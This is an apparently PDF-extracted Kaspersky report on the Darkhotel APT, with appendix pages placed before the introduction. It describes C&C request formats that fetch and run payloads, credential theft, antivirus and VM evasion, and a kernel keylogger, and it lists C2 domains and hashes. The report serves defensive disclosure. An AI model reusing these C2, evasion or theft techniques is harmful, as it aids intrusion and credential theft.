does some additional checks . If « U » file is older than 180 days , the module wipes
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
59
the file . If not , it triggers a special variable that makes module dormant and dis-
ables further communication with C&C server .
After all , if the module is ready and allowed to communicate with C&C server it
does that in the following manner .
1 . 	  The module connects to autolace.twilightparadox.com ( or automachine .
servequake.com ) and issues a HTTP GET request with hardcoded User­Agent
string :
GET /major / images / view.php HTTP/1.1
User­Agent : Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;
Media Center PC 6.0 )
Host : autolace.twilightparadox.com
Connection : Keep­Alive
Cache­Control : no­cache
The server response should contain « DEXT87 » string which is used to rec-
ognize valid response . The malware locates « DEXT87 » and reads the data
appended to it . The appended data should be an IP address in plaintext . This
is used a real C&C IP address . Reading stops when non­digit or dot symbol is
found . Here is an example of shortest possible valid server response :
HTTP/1.1 200 OK
Content­Length : 17
DEXT87192.168.1.1
2 . 	  If the real C&C IP address is not valid the module may try to send identical
request again but using a different HTTP path : /major / images / read.php
If the C&C IP address is valid , the module issues another HTTP request :
GET /major / txt / read.php HTTP/1.1
User­Agent : Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
SLCC2;
.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Cen-
ter PC 6.0 )
Host : autolace.twilightparadox.com
Connection : Keep­Alive
Cache­Control : no­cache
The server response can be one of the following :
a. DEXT87no
b. DEXT87up;<DATASIZE>;<DATA >
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
60
Where < DATASIZE > is a decimal integer that represents length of < DATA >
field in bytes; < DATA > is a binary data separated from < DATASIZE > field by
semicolon . Please note , that after receiving < DATA > , it is XORed with byte
value 0x55 and saved to a disk in a file named « ctfmon.exe » ( current directory
is used ) . Upon successful receiving of the file it is started in a new process .
Information Stealer
Filename       MD5                                   Link Time ( UTC )            Linker
DmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                        6.0
00:25:59
This module is relatively large ( 455Kb ) and comes as a part of WinRar SFX file
that drops and starts the module from % APPDATA%\Microsoft\Display\DmaUp3 .
exe . The main purpose of the module is to collect various secrets stored on a
local system . This module is designed not to run on Windows with system default
codepage set to Korean .
Technical Details
From the very beginning this module checks if « bdagent.exe » process is running
on current system . Bdagent.exe is a name for BitDefender Antivirus component .
If it is running , it uses simple AV heuristics evasion technique . The code starts a
thread that simulates keystrokes of ESC keyboard key and then shows a system
modal message box . Pushing ESC key closes the modal message box . Right after
that keystroke generation thread is terminated and the module continues normal
execution as if « bdagent.exe » was not running .
Next the module makes sure only one instance of current code is running by
checking if system mutex object named « 920111215 » exists . After that , the mod-
ule collects information about current system which includes the following :
• 	   	 Network adapter MAC address
• 	   	 CPU Name and Identifier
• 	   	 System default codepage
• 	   	 Windows OS and Service Pack versions
• 	    	 Hostname and IP address
• 	     	 Local user name
• 	      	 Cached passwords from Internet Explorer 6/7/8/9 ( Protected Storage and
IntelliForms )
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
61
• 	  Mozilla Firefox stored secrets ( < 12.0 )
• 	  Chrome stored secrets
• 	  MS Outlook Express accounts
• 	  MS Windows Mail accounts
• 	  MS Windows Live Mail accounts
• 	  MS Outlook accounts ( SMTP / IMAP / POP3/HTTP )
• 	  MSN Messenger
• 	  Gmail Notifier credentials
• 	  Google Desktop accounts
• 	  Google Talk accounts
If the module reveals that current System default codepage is 0412 ( Korean ) it
terminates .
There is one interesting specifics in Microsoft IntelliForms which reveals attack-
er ’s interests . IntelliForms technology keeps login / password information in the
registry in encrypted form . However , there is no clear information about the corre-
sponding website which requires given login and password . The only information
Intelliforms offers about the place where given login / password should be used
is a hash of the webpage URL . So far , the attackers can steal logins and pass-
words but to understand where they are from they must guess the string which
produced given hash . They have implemented this logics in the malware . When
IntelliForms information is stolen the malware tries to check the list of known
login page URLs to recover the originating webpage address . Here is the list of
URLs that are checked by the malware :
•
•
•
•
•
•
•
•
•
•
•
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
62
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•
The list of targeted services includes some local services specifically popular in :
• 	 	 United States
• 	 	 Russia
• 	 	 China
• 	 	 Japan
• 	 	 Middle Eastern countries
• 	 	 India
The module uses several simple XOR­based algorithms to encrypt embedded
string data . String encryption / decryption functions use the following keys :
« Microsoft Corporation . All rights reserved . »
« 90ed768ab728a0f74a4b957c31f1a213 »
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
63
The module works with all Firefox versions prior to Mozilla Firefox 12.0 . Depend-
ing on version of Firefox , it can read Firefox database directly to dump stored se-
crets or utilize one Firefox libraries to access the configuration data . In addition it
makes use of the following Mozilla Firefox libraries depending on Firefox version :
• 	 	 nss3.dll
• 	 	 plc4.dll
• 	 	 mozcrt19.dll
• 	 	 mozutils.dll
• 	 	 mozglue.dll
• 	 	 mozsqlite3.dll
• 	 	 sqlite3.dll
• 	 	 nspr4.dll
• 	 	 plds4.dll
• 	 	 nssutil3.dll
• 	 	 softokn3.dll
When stealing secrets from Firefox and Chrome it uses built­in SQLite library code .
The module is linked with SQLite version 3.7.5 release candidate 2 , release
hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated as 2011­01­28
17:03:50 .
After stealing secrets from local system the malware executes some kind of
embedded script . It is logging all actions to inform the operator what exactly was
executed by this variant of the malware . The result of this execution is appended
to the stolen data and uploaded to the C&C server .
The module uploads all collected information to one of the following URLs via
POST request :
•
•
•
•
It ’s the first time we see .pn domain used in malware . This top level country code
domain is quite exotic and is assigned to Pitcairn Islands , which is Overseas ter-
ritory of the United Kingdom in the Pacific . As of 2013 estimated population of
Pitcairn Islands is only 56 people . An official .pn domain costs $ 100/year from
the registry , however .eu.pn domains seem to be given away for free .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
64
The malware uses fixed User­Agent string :
Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
.NET   CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Cen-
ter PC 6.0 )
The data is uploaded as a POST request binary in the following format :
< UserId>;<UniqueMachineId>;<EncryptionKey>;<GeneralSysInfo >
where < UserId > is hardcoded identifier ( i.e. « user2 » in current sample);
< UniqueMachineId > is a 32 characters long hex string which derived from net-
work card MAC address; < EncryptionKey > is symmetrical encryption key used to
encrypt < UserId > and < GeneralSysInfo > values . The malware uses text protocol ,
which is why potentially binary values of < UserId > and < GeneralSysInfo > are ad-
ditionally encoded using Base64 algorithm .
< GeneralSysInfo > field contains only basic information about the system , i.e. :
Info;
Sys@User : MYCOMPUTER@MyUser ( 0850 )
C P U : Intel(R ) Core(TM ) i3­1667U CPU @ 1600GHz
System OS : Microsoft Windows XP ( Service Pack 3 )
Net card : 192.168.0.2 ( 133773311337 )
If the server reply contains a keyword « minmei » it continues sending additional in-
formation . « Minmei » may be a reference to a popular Japanese anime and manga
known as « The Super Dimension Fortress Macross » . A quote from Wikipedia :
« Born in Yokohama Chinatown , Japan ( though she is of partial Chinese descent )
as Linn Minmei , Minmay moved in with her uncle Shaochin ( 少江 ) and aunt Feic-
hun ( 慧中 ) on South Ataria Island in hopes of finding the path to fulfill her dream
of becoming a star . »
Trojan . Win32.Karba.e
Filename        MD5                                  Link Time ( UTC )           Linker
acroedit.exe    0fe3daf9e8b69255e592c8af97d24649     2013.10.29 00:21:48       6.0
Technical Notes
The trojan iterates through running processes and looks for security software
basing on executable filenames from the list below . If the process is found it
keeps a record of the software name using short AV Identifier string from the fol-
lowing table of rules
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
65
Process Name                AV Identifier                 Company Name , Country
ekrn.exe                    NOD                           ESET , Czech Republic
NVCAgent.npc                NV                            Naver NHN , Vietnam
360tray.exe                 36                            Qihoo 360 , China
msseces.exe                 MS                            Microsoft , USA
uiWinMgr.exe                TR                            TrendMicro , Japan
AvastSvc.exe                AST                           Avast , Czech Republic
RsMgrSvr.exe                RS                            Rising , China
mcagent.exe                 MC                            McAfee , USA
avgidsagent.exe             AV                            AVG , Czech Republic
ccsvchst.exe                NT                            Symantec , USA
bdagent.exe                 BD                            BitDefender , Romania
avp.exe                     KS                            Kaspersky , Russia
V3LTray.exe                 V                             AhnLab , South Korea
AYAgent.aye                 AY                            ESTSoft , South Korea
The malware uses a trick to evade running on a VMware . First , it checks if cur-
rent process is running in WOW64 environment . If yes it does additional port
I / O specific to VMWare virtual machine ( the VMware hypervisor port : 0x5658;
VMware hypervisor magic value : 0x564D5868 ) . Another method to detect VM en-
vironment is to check local network adapter ’s IP address . If it belongs to subnet
192.168.100 . * then the malware believes it ’s running in a VM . If VM is detected
the process instantly terminates .
Next the malware submits collected information to the C&C server using HTTP
GET request and the following URL format : http://<C2DOMAIN>/bin / read_i.php
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
66
? a1=%STEPID%&a2=%HOSTID%&a3=%SYSINFO%&a4=% AVSOFTID% , where
% C2DOMAIN% is one of the following C&C domains :
• 	 	 micronaoko.jumpingcrab.com
• 	 	 microchsse.strangled.net
• 	 	 microbrownys.strangled.net
• 	 	 microplants.strangled.net
• 	 	 microlilics.crabdance.com
% STEPID% is special text string indicating stage of malware operation . This string
varies depending on the local system language and may be one of the following :
• 	 	 « step2-down - k » for codepage 0412 ( Korean )
• 	 	 « step2-down - j » for codepage 0411 ( Japanese )
• 	 	 « step2-down - u » for codepage 0409 ( English , US )
• 	 	 « step2-down - r » for codepage 0419 ( Russian )
• 	 	 « step2-down - c » for codepage 0804 ( Chinese )
• 	 	 “ step2-down - b ” for codepage 0409 ( English , US )
• 	 	 « step2-down » for other codepages;
% HOSTID% is a special value generated from local network card MAC address;
% SYSINFO% is a string with general system information ( please see description
above);
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
67
% AVSOFTID% is a string that contains indexes of AV software names in internal
table of AV Identifiers ( please see the table above ) .
Selective Infector
Technical Notes
Igfxext.exe can download a file and drop it to % APPDATA%\microsoft\dis-
play\ctfmon.exe ( md5= e8bfb82b0dd5cef46116d61f62c25060 ) . After
execution , the downloaded file drops SMAGENT.EXE ( md5 0306f9ae-
7786570139f78e78bc940597 ) to % APPDATA%\MICROSOFT\DISPLAY and ex-
ecutes it . This component is a virus , and is used to selectively infiltrate into other
computers via USB or network shares .
Trojan - Dropper & Injector ( infected legitimate files )
Technical Notes
A large number of files are detected by Kaspersky Lab scanners as Virus . Win32 .
Pioneer.dx . These files are all legitimate files that have been infected by another
Darkhotel component . All of these infected files drop a 63 kb self injecting compo-
nent .
Filename       MD5                                   Link Time ( UTC )           Linker
igfxext.exe    fcd2458376398b0be09eaa34f4f4d091      2012:07:27 17:10:30       6.0
This malware is 63 kb in size . It is bound to a variety of other software packages
that vary in name , but the host package is consistently detected as “ Virus . Win32 .
Pioneer.dx ” . The igfxext.exe component is dropped to disk and run . It spawns an-
other suspended process with its own igfxext.exe image , but decrypts a smaller
32 kb executable ( cf1319d94f33380622ba000b7d8ad6e9,Trojan­Downloader .
Win32.Agent.xwge ) from its .data section in memory with a simple xor 0xbb . The
running process overwrites the igfxext.exe image in the suspended process with
this smaller chunk of code . It then resumes the thread in the new process .
This smaller code section maintains similar functionality to the “ worm ” compo-
nent :
• 	  B 	  ASICAPI window creation and update
• 	 	 VMWare detection / red pill
• 	 	 AV check
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
68
• 	  d 	  maup3.exe checks
• 	  p 	  roto.dat check
• 	  s 	  ystem information collection , encryption with
« ab911001f78ad31552e47205ecc46466 » key and transfer to c2
Host package files detected as “ Virus . Win32.Pioneer.dx ” are infected legitimate
files , that do not have any self­propagation routines .
Enhanced Keyloggers and Development
Technical Notes
It is signed with the familiar “                                     ” digital certificate .
77669d11c3248a6553d3c15cd1d8a60e ­csmrs.exe , 478.8 kb ,
CompliedOn:2010­11­11 08:46:47
Signed by                         certificate .
This sample is started by code running within svchost.exe on WinXP SP3 . It drops
a keylogger . The debug path inside :
d:\KerKey\KerKey(일반)\KerKey\release\KerKey.pdb
Note ­일반 ­means “ General ” in Korean
The dropper above maintains , drops and installs this kernel mode keylogger :
md5 : 86b18e99072ba72d5d36bce9a00fc052 filename : ndiskpro.sys
size : 295 kb
CompiledOn:2009­11­24 11:56:22
Likely , it was developed as a part of a mid­to­late 2009 project :
e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.c
Keylogger Code
This driver package is built to look like a legitimate low level Microsoft system
device . It is installed as a system kernel driver “ Ndiskpro ” service , described as
a “ Microcode Update Device ” . It is somewhat surprising that there is no rootkit
functionality hiding this service :
TLP : Green 	                  For any inquiries , please contact intelreports@kaspersky.com
69
When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and
retrieves keystroke data directly from port 0x60 , the motherboard keyboard con-
troller itself . Here we see the local port variables assigned values
And here , the ports are directly being read with READ_PORT_UCHAR(0x64 ) and
then READ_PORT_UCHAR(0x60 ) :
It buffers , then communicates the data to the running user mode component .
This component then encrypts and writes the retrieved values ondisk to a ran-
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
70
domly named .tmp , file like ffffz07131101.tmp . This file is located in the same
directory as the original dropper , which maintains persistence across reboots with
a simple addition to the HKCU run key .
Here is debug output demonstrating this component ’s data retrieval when the
letter “ D ” is repeatedly pressed on the keyboard . Keyscan make and break codes
are “ 0x20 ” and “ 0xA0 ” and for the key press and key release for the “ D ” key . The
“ 0x1D ” value from port 0x64 that you see below is basically an indication that
the output buffer is full and the keyboard is locked , so it is safe for the driver to
access the key value in port 0x60 :
0x60 port access , data = 0x20
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
0x60 port access , data = 0xA0
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
0x60 port access , data = 0x20
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
0x60 port access , data = 0xA0
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
71
0x60 port access , data = 0x20
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
0x60 port access , data = 0xA0
0x64 port access , data = 0x1D
0x64 port access , data = 0x1D
0x60 port access , data = 0x20
[ Output DeviceObject = 0x0 , bIsHidKbd = 0x0
< > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < >
< > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < >
DR0 = 0x60 , DR1 = 0x64 , DR2 = 0xF7190410 , DR3 = 0x0 , DR6 = 0xFFFF2FF0 ,
DR7 = 0x22073F
Current ISR , HighAddress = 0xf718 , LowAddress = 0xf330 , Flag = 0xee oldCR4 =
0x6F9
oldDR7 = 0x22073F
< > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < >
< > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < > < >
These debug messages and code style are duplicates of what chpie posted in the
past .
This keylogger module encrypts and stores gathered data in a log file , as men-
tioned previously . Its encryption algorithm is similar to RC4 . Interesting part is
that the module randomly generates the key and stores it in an unexpected place :
in the middle of the log file name . Hence , the numeric part of the filename is used
as a seed for the pseudorandom number generator . Rand function is statically
linked to insure same results on different computers .
Here is the commented RC4 encryption code :
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
72
TLP : Green 	    For any inquiries , please contact intelreports@kaspersky.com
73
Appendix E. Parallel and Previous Research
Getting “ Left of Boom ” : How ThreatConnect Enables Proactive Cybersecurity ,
ThreatConnect February 2014
http://www.threatconnect.com / news / getting - leftof - boom - threatconnect - en-
ables - proactive - cybersecurity/
Nevermind Nenim ’s hidden agenda ­we still caught it , Microsoft MMPC , April 2013
http://blogs.technet.com / b / mmpc / archive/2013/04/14/nevermind - nenim - s-
hidden-agenda-we-still-caught-it.aspx
RSA­512 Certificates abused in the wild , Fox­IT November 2011
http://blog.fox-it.com/2011/11/21/rsa-512-certificates-abused-in-the-wild/
Dec 21 CVE­2009­0556 ( corrected CVE ) Christmas Messages.pps with stolen cert from
Syniverse from nicholas.bennett53@hotmail.com , Contagio , December 2010
http://contagiodump.blogspot.ro/2010/12/dec-21-cve-2010-2572-christmas.html
“ CVE­2010­2883 Adobe 0­Day David Leadbetter ’s One Point Lesson from
193.106.85.61 thomasbennett34@yahoo.com ” , Contagio , Sept 2010
http://contagiodump.blogspot.ro/2010/12/dec-21-cve-2010-2572-christmas .
html
Apr 26 CVE­2010­0188 PDF North Korea Policy Piece from ( fake ) walterkeats@
yahoo.com , Contagio , April 2010
http://contagiodump.blogspot.com/2010/09/cve - david - leadbetters - one - point-
lesson.html
Mar 27 CVE­2010­0806 IE 0­day Dozens missing after ship sinks near North Korea
from kevin.bohn33@hotmail.com , Contagio March 2010
http://contagiodump.blogspot.com/2010/04/apr-28-cve-2010 - 0188-pdf-
north-korea.html
Threat Outbreak Alert : Fake North Korean Sunken Ship Report E­mail Messages
on March 27 , 2010 , Cisco
http://tools.cisco.com/security/center/viewThreatOutbreakAlert.x?alert
Id=20148
Security Advisory for Adobe Reader and Acrobat , Adobe , cve­2010­2883
http://www.adobe.com/support/security/advisories/apsa10-02 .
html?PID=6157500
TLP : Green 	               For any inquiries , please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow , 125212
Russian Federation
more contact details
Tel : 	 + 7 - 495 - 797 - 8700
Fax : 	 +7 - 495 - 797 - 8709
E - mail : 	  info@kaspersky.com
Website : 	  www.kaspersky.com

The Darkhotel APT
A Story of Unusual
Hospitality
Version 1.0
November , 2014
Global Research and Analysis Team
2
Contents
Executive Summary ................................................................................................. 3
Introduction ............................................................................................................. 4
Analysis .................................................................................................................... 5
Delivery - Hotels / Business Centers and Indiscriminate Spread ..................... 5
Hotels and Business Centers Spread ......................................................... 5
Abusing Network Infrastructure ................................................................... 6
Indiscriminate Spread .................................................................................. 7
Darkhotel Spear - phishing Campaigns ........................................................ 8
Recent 0-day Deployment ........................................................................... 9
Digital Certificates and Delegitimizing Certificate Authority Trust ................... 9
Cracking the keys ...................................................................................... 12
Other Tapaoux Certificates ........................................................................ 12
Enhanced Keyloggers and Development ...................................................... 13
Keylogger Code .......................................................................................... 13
Interesting Malware Components ....................................................................... 15
Small Downloader .......................................................................................... 15
Information Stealer ......................................................................................... 16
Trojan . Win32.Karba.e ..................................................................................... 17
Trojan - Dropper & Injector ( infected legitimate files ) ..................................... 17
Selective Infector ............................................................................................ 18
Campaign Codes ............................................................................................. 18
Infrastructure and Victims ................................................................................... 19
Sinkhole Domains ........................................................................................... 19
Victim Locations - KSN and Sinkhole Data .................................................... 20
KSN Data ................................................................................................... 20
Sinkhole Data ............................................................................................ 22
Available ddrlog Victim Data ........................................................................... 22
C2 Communications and Structure ............................................................... 24
Victim Management ........................................................................................ 25
Researcher Activity .................................................................................... 26
Conclusions .......................................................................................................... 27
TLP : Green 	                              For any inquiries , please contact intelreports@kaspersky.com
3
Executive Summary
The Darkhotel APT is a threat actor possessing a seemingly inconsistent and con-
tradictory set of characteristics , some advanced and some fairly rudimentary . In-
hospitably operating for almost a decade , the threat actor is currently active . The
actor ’s offensive activity can be tied to specific hotel and business center Wi‑Fi
and physical connections , some of it is also tied to p2p / file sharing networks ,
and they have been known to spear - phish targets as well . Darkhotel tools are
detected as “ Tapaoux ” , “ Pioneer ” , “ Karba ” , and “ Nemim ” , among other names .
The following list presents a set of characteristics for the crew :
• 	  operational competence to compromise , mis - use , and maintain access to
global scale , trusted commercial network resources with strategic precision
for years
• 	  advanced mathematical and crypto - analytical offensive capabilities , along
with no regard for undermining the trust extended to the Certificate Authorities
and the PKI
• 	  indiscriminately infect systems with some regional clarity over trusted and
untrusted resources to build and operate large botnets
• 	  well - developed low level keyloggers within an effective and consistent toolset
• 	  a focus throughout campaigns on specific victim categories and tagging them
• 	  a larger , dynamic infrastructure built of apache webservers , dynamic dns
records , crypto libraries , and php webapps
• 	  regular 0-day access - recent deployment of an embedded Adobe Flash 0-day
spear - phishing exploit , and infrequent deployment of other 0-day resources to
sustain larger campaigns over several years
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
4
Introduction
When unsuspecting guests , including situationally aware corporate executives and
high - tech entrepreneurs , travel to a variety of hotels and connect to the internet ,
they are infected with a rare APT Trojan posing as any one of several major software
releases . These might be GoogleToolbar , Adobe Flash , Windows Messenger , etc .
This first stage of malware helps the attackers to identify more significant victims ,
leading to the selective download of more advanced stealing tools .
At the hotels , these installs are selectively distributed to targeted individuals . This
group of attackers seems to know in advance when these individuals will arrive
and depart from their high - end hotels . So , the attackers lay in wait until these
travelers arrive and connect to the Internet .
The FBI issued advisories about similar hotel incidents ; Australian government offi-
cials produced similar , newsworthy accounts when they were infected . While an FBI
announcement related to attacks on hotel guests overseas appeared in May 2012 ,
related Darkhotel samples were already circulating back in 2007 . And available
Darkhotel server log data records connections as early as Jan 1 , 2009 . Addition-
ally , seeding p2p networks with widely spread malware and 0-day spear - phishing
attacks demonstrate that the Darkhotel APT maintains an effective toolset and a
long - running operation behind the questionable hospitality it shows its guests .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
5
Analysis
Delivery - Hotels / Business Centers and Indiscriminate Spread
Hotels and Business Centers Spread
The Darkhotel APT ’s precise malware spread was observed in several hotels’
networks , where visitors connecting to the hotel ’s Wi - Fi were prompted to install
software updates to popular software packages .
Of course , these packages were really installers for Darkhotel APT ’s backdoors ,
added to legitimate installers from Adobe and Google . Digitally signed Darkhotel
backdoors were installed alongside the legitimate packages .
The most interesting thing about this delivery method is that the hotels require
guests to use their last name and room number to login , yet only a few guests
received the Darkhotel package . When visiting the same hotels , our honeypot
research systems could n’t attract a Darkhotel attack . This data is inconclusive ,
but it points to misuse of check - in information .
TLP : Green 	                For any inquiries , please contact intelreports@kaspersky.com
6
Abusing Network Infrastructure
The Darkhotel actor maintained an effective intrusion set at hotel networks ,
providing ample access to unexpected points of attack over several years . These
staging points also provide the attackers with access to check - in / check - out and
identity information of visitors to high - end and luxury hotels .
As a part of an ongoing investigation , our research led us to embedded iframes
within hotel networks that redirected individuals’ web browsers to phony install-
ers . The attackers were very careful with the placement of these iframes and
executables on trusted resources - the hotels’ network login portals themselves .
The attackers were also very careful to immediately delete all traces of their
tools as soon as an attack was carried out successfully . Those portals are now
reviewed , cleaned and undergoing a further review and hardening process . We
observed traces of a couple of these incidents in late 2013 and early 2014 on
a victim hotel ’s network . The attackers set up the environment and hit their
individual targets with precision . As soon as their target ’s stay was over and
the attack - frame was closed , the attackers deleted their iframe placement and
backdoored executables from the hotel network . The attackers successfully de-
leted traces of their work from earlier attacks in another hotel , but their offensive
techniques were the same . Outside reports of the same activity at other hotels
provide enough data to confirm the same careful operations there .
The attack technique blurs the line between a couple of common APT tactics ;
fairly inaccurate “ watering holes ” or “ strategic web compromises ” and more
accurate spearphishing techniques . In this case , the Darkhotel attackers wait
for their victim to connect to the Internet over the hotel Wi - Fi or the cable in their
room . There is a very strong likelihood the targets will connect over these resourc-
es , and the attackers rely on that likelihood , much like at a watering hole . But the
attackers also maintain truly precise targeting information over the victim ’s visit ,
much like they would know a victim ’s email address and content interests in a
spearphishing attack . While setting up the attack , the Darkhotel attackers knew
the target ’s expected arrival and departure times , room number , and full name ,
among other data . This data enables the attackers to present the malicious
iframe precisely to that individual target . So , here we have yet another unique
characteristic of this attacker - they employ a loosely certain but highly precise
offensive approach .
TLP : Green 	                 For any inquiries , please contact intelreports@kaspersky.com
7
Indiscriminate Spread
An example of the Darkhotel APT ’s indiscriminate malware spreading is dem-
onstrated by the way it seeds Japanese p2p sharing sites , where the malware
is delivered as a part of a large ( approximately 900 mb ) rar archive . The archive
is also spread over bittorrent , as detailed below . Darkhotel uses this method to
distribute their Karba Trojan . These Japanese archives , translated for Chinese
speaking viewers , appear to be sexual in nature , part of an anime sex / military
comic scene , exposing the likely interests of potential targets .
This Darkhotel package was downloaded over 30,000 times in less than
six months . The p2p bittorrent Darkhotel offering is listed here , posted on
2013.11.22 . It was spread throughout 2014 .
( 一般コミック ) [ 古味直志 ] ニセコイ 第01­09巻.rar
This torrent serves up an almost 900 mb file . The rar archive decompresses to
a   directory full of encrypted zips , the associated decryptor and a password file for
decrypting the zips . But what looks like the AxDecrypt.exe decryptor is bound to
both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan .
When a user downloads the torrent and decrypts the zip files , the trojan surrepti-
tiously is installed and run on the victim system .
Catch.exe , detected as Backdoor . Win32.Agent.dgrn , communicates with the fol-
lowing Darkhotel command and control servers :
microdelta.crabdance.com
microyours.ignorelist.com
micronames.jumpingcrab.com
microchisk.mooo.com
microalba.serveftp.com
TLP : Green 	                   For any inquiries , please contact intelreports@kaspersky.com
8
Other examples of this Darkhotel backdoor bound within a shared torrent include
adult content Japanese anime and more . There are tens of thousands of down-
loads of these individual torrents .
“ torrent\[hgd资源组][漫画]comic1☆7漫画合集③+④+⑤+特典[5.08g][绅士
向][总第四十三弹]（七夕节快乐！）\汉化\(comic1☆7 ) [ 莉零 ( 小鹿りな , 古
代兵器 ) ] 凌 ­shinogi­(闪乱カグラ ) [ 中文 ] “
and
“ 動漫\[hgd资源组][漫画]comic1☆7漫画合集③+④+⑤+特典[5.08g][绅士向 ] [
总第四十三弹]（七夕节快乐！）\汉化 ” )
The associated Darkhotel backdoor was hosted on bittorrent , emule , etc , under
a variety of comic names . Examples include comics and anime offerings . Related
Darkhotel command and control server domains include :
microblo5.mooo.com
microyours.ignorelist.com
micronames.jumpingcrab.com
microchisk.mooo.com
microalba.serveftp.com
Darkhotel Spear - phishing Campaigns
Darkhotel campaigns involving typical spear - phished Tapaoux implants publicly
appeared in bits and pieces several times over the past five years . These subproject
efforts targeted defense industrial base ( DIB ) , government , and NGO organizations .
Email content on topics like nuclear energy and weaponry capabilities was used as
a lure . Early accounts were posted on contagio describing attacks on   NGO organi-
zations and government policy makers . This spear - phishing activity continues into
2014 . The attacks follow the typical spear - phishing process and in the past couple of
months , exploited systems retrieved downloader executables from web servers like
hxxp://office­revision.com / update / files22/update.exe or hxxp://trade­inf.com / mt/
duspr.exe
Over the past few years the group has emailed links that redirect targets’ brows-
ers to Internet Explorer 0-day exploits . Sometimes the attachment itself includes
an Adobe 0-day exploit .
TLP : Green 	                    For any inquiries , please contact intelreports@kaspersky.com
9
Recent 0-day Deployment
This crew occasionally deploys 0-day exploits , but burns them when required . In
the past few years , they deployed 0-day spear - phishing attacks targeting Adobe
products and Microsoft Internet Explorer , including cve­2010­0188 . In early 2014 ,
our researchers exposed their use of cve­2014­0497 , a Flash 0-day described on
Securelist in early February .
The crew spear - phished a set of target systems connected to the Internet through
Chinese ISPs , and developed capabilities within the 0-day exploits to handle
hardened Windows 8.1 systems . It ’s interesting that the Flash objects were
embedded in Korean documents titled “ List of the latest Japanese AV wind and
how to use torrents.docx ” ( loose English translation ) . The dropped downloader
( d8137ded710d83e2339a97ee78494c34 ) delivered malcode similar to the
“ Information Stealer ” component functionality summarized below , and detailed
in Appendix D.
Digital Certificates and Delegitimizing Certificate Authority
Trust
The Darkhotel actors typically sign their backdoors with digital certificates of one
kind or another . However , the certificates originally chosen by this crew are very
interesting because of their weak keys and likely abuse by attackers . Here is a
listing of the certs that were commonly used to sign Darkhotel malcode , requiring
advanced mathematical capabilities to factorize the keys at the time . They are
not the only certificates used by the group . More recent activity suggests that the
group has stolen certificates to sign their code .
Subordinate
CA Root        CA / Issuer             Owner                     Status          Valid From    Valid To
GTE            Digisign Server ID    flexicorp.jaring.my sha1/ Expired        12/17/2008    12/17/2010
CyberTrust     ( Enrich )              RSA ( 512 bits )
GTE            Cybertrust            inpack.syniverse.my       Revoked         2/13/2009     2/13/2011
CyberTrust     SureServer CA         sha1/RSA ( 512 bits )
GTE            Cybertrust            inpack.syniverse.com      Revoked         2/13/2009     2/13/2011
CyberTrust     SureServer CA         sha1/RSA ( 512 bits )
GTE            Anthem Inc            ahi.anthem.com sha1/      Invalid Sig .    1/13/2010     1/13/2011
CyberTrust     Certificate Auth      RSA ( 512 bits )
TLP : Green 	                         For any inquiries , please contact intelreports@kaspersky.com
10
Subordinate
CA Root        CA / Issuer             Owner                        Status          Valid From    Valid To
GlobalSign     Deutsche Telekom www.kuechentraum2                Revoked         10/20/2008    10/25/2009
CA 5              4.de
sha1/RSA ( 512 bits )
GTE            Digisign Server ID    payments.bnm.gov.m y         Invalid Sig .    12/7/2009     12/7/2010
CyberTrust     ( Enrich )              sha1/RSA ( 512 bits )
GTE            TaiCA Secure CA       esupplychain.com.tw          Expired         7/2/2010      7/17/2011
CyberTrust                          sha1/RSA ( 512 bits )
GTE            Digisign Server ID    mcrs2.digicert.com . my       Invalid Sig     3/28/2010     3/28/2012
CyberTrust     ( Enrich )              sha1/RSA ( 512 bits )
GTE            Cybertrust            agreement.syniverse .     Invalid Sig         2/13/2009     2/13/2011
CyberTrust     SureServer CA         com sha1/RSA ( 512 bits )
GTE            Cybertrust            ambermms.syniverse .          Invalid Sig .    2/16/2009     2/16/2011
CyberTrust     SureServer CA         com
sha1/RSA ( 512 bits )
Equifax        Equifax Secure        secure.hotelreykjavik.i s    Invalid Sig     2/27/2005     3/30/2007
Secure         eBusiness CA­1        md5/RSA ( 512 bits )
eBusiness
CA­1
